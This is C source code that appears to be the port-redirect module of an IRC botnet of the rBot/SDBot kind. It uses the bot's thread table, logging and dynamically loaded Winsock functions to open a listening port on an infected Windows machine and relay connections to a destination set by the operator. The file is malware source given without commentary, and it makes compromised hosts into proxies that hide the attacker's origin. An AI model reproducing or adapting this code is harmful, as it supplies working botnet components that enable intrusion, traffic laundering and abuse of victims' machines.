#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_REDIRECT

// port redirect function
DWORD WINAPI RedirectThread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->gotinfo = TRUE;

	char sendbuf[IRCLINE];
	DWORD id;

	SOCKADDR_IN rsin, csin;	
	memset(&rsin, 0, sizeof(rsin));
	rsin.sin_family = AF_INET;
	rsin.sin_port = fhtons((unsigned short)redirect.lport);
	rsin.sin_addr.s_addr = INADDR_ANY;

	int csin_len = sizeof(csin);

	SOCKET rsock, csock;
	if ((rsock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		threads[redirect.threadnum].sock = rsock;

		fWSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
		if (fbind(rsock, (LPSOCKADDR)&rsin, sizeof(rsin)) == 0) {
			if (flisten(rsock, 10) == 0) {
				while(1) {
					if ((csock = faccept(rsock, (LPSOCKADDR)&csin, &csin_len)) != INVALID_SOCKET) {
						redirect.csock = csock;

						redirect.gotinfo = FALSE;
						sprintf(sendbuf,"[REDIRECT]: Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, redirect.threadnum); 
						redirect.cthreadnum = addthread(sendbuf,REDIRECT_THREAD,csock);
						threads[redirect.cthreadnum].parent = redirect.threadnum;
						if (threads[redirect.cthreadnum].tHandle = CreateThread(NULL,0,&RedirectLoopThread,(LPVOID)&redirect,0,&id)) {
							while (redirect.gotinfo == FALSE) 
								Sleep(50);
						} else {
							addlogv("[REDIRECT]: Failed to start client thread, error: <%d>.", GetLastError());
							break;
						}
					}
				}
			}
		}
	}

	fclosesocket(csock);
	fclosesocket(rsock);
	clearthread(redirect.threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the remote connection.
DWORD WINAPI RedirectLoopThread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->gotinfo = TRUE;

	int threadnum=redirect.cthreadnum;

	char sendbuf[IRCLINE], buff[4096];
	int err;
	DWORD id;
	
	SOCKET ssock;
	do {
		if ((ssock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) break;

		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned short)redirect.port);

		IN_ADDR iaddr;
		iaddr.s_addr = finet_addr(redirect.dest);
		LPHOSTENT hostent;
		if (iaddr.s_addr == INADDR_NONE) 
			hostent = fgethostbyname(redirect.dest);
		else 
			hostent = fgethostbyaddr((const char *)&iaddr, sizeof(iaddr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	
		if ((err = fconnect(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) break;

		redirect.cgotinfo = FALSE;
		sprintf(sendbuf,"[REDIRECT]: Client connection to IP: %s:%d, Server thread: %d.", finet_ntoa(ssin.sin_addr), ssin.sin_port, redirect.threadnum); 
		redirect.cthreadnum = addthread(sendbuf,REDIRECT_THREAD,ssock);
		threads[redirect.cthreadnum].parent = redirect.threadnum;
		threads[redirect.cthreadnum].csock = threads[threadnum].sock;
		if (threads[redirect.cthreadnum].tHandle = CreateThread(NULL,0,&RedirectLoop2Thread,(LPVOID)&redirect,0,&id)) {
			while (redirect.cgotinfo == FALSE) 
				Sleep(50);
		} else {
			addlogv("[REDIRECT]: Failed to start connection thread, error: <%d>.", GetLastError());
			break;
		}

		while (1) {
			memset(buff, 0, sizeof(buff));
			if ((err = frecv(threads[threadnum].sock, buff, sizeof(buff), 0)) <= 0) break;
			if ((err = fsend(ssock, buff, err, 0)) == SOCKET_ERROR) break;
		}
		break;
	} while (1);

	fclosesocket(threads[threadnum].sock);
	fclosesocket(ssock);

	clearthread(threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the local connection.
DWORD WINAPI RedirectLoop2Thread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->cgotinfo = TRUE;

	int threadnum=redirect.cthreadnum, err;
	
	char buff[4096];

	while (1) {
		memset(buff, 0, sizeof(buff));
		if ((err = frecv(threads[threadnum].csock, buff, sizeof(buff), 0)) <= 0) break;
		if ((err = fsend(threads[threadnum].sock, buff, err, 0)) == SOCKET_ERROR) break;
	}
	fclosesocket(threads[threadnum].csock);

	clearthread(threadnum);

	ExitThread(0);
}
#endif
